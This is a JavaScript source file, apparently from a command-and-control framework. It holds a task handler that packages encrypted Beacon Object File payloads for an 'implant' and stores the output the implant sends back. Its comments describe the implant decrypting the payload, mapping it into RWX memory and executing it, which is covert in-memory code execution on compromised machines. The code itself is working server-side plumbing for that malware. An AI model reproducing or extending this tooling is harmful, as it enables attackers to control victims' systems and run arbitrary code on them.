// BOF Execute (Inline) Task Handler
// Sends: task_id:base64("BOF_INLINE:<base64_ciphertext>")
// The payload is an AES-256-CBC encrypted BCOF bundle packed by the CLI.
// Implant decrypts, maps the COFF .o in RWX memory, resolves imports,
// calls go(args, args_len), and returns captured BeaconOutput as the result.
export class TaskHandler {
  constructor(task) {
    this.task = task
  }

  getTask = async function (req, res) {
    const { payload }   = JSON.parse(this.task.parameters)
    const instruction   = `BOF_INLINE:${payload}`
    const encoded       = `${this.task.id}:${Buffer.from(instruction).toString('base64')}`
    const kb            = Math.round(Buffer.from(payload, 'base64').length / 1024)
    const display       = `BOF Execute (inline, ${kb} KB encrypted)`
    db.prepare(`UPDATE tasks SET display = $display WHERE id = $task_id`)
      .run({ task_id: this.task.id, display })
    this.task.display = display
    res.send(encoded)
  }

  taskIO = async function (req, res) {
    this.task.output       = Buffer.from(req.body, 'base64').toString('utf8')
    this.task.completed_at = Date.now()
    db.prepare(`UPDATE tasks SET (output, completed_at) = ($output, $completed_at) WHERE id = $task_id`)
      .run({ task_id: this.task.id, output: this.task.output, completed_at: this.task.completed_at })
    res.type('text/plain').send('success')
    io('task_complete', this.task)
    delete active_implant_handlers[this.task.id]
  }
}
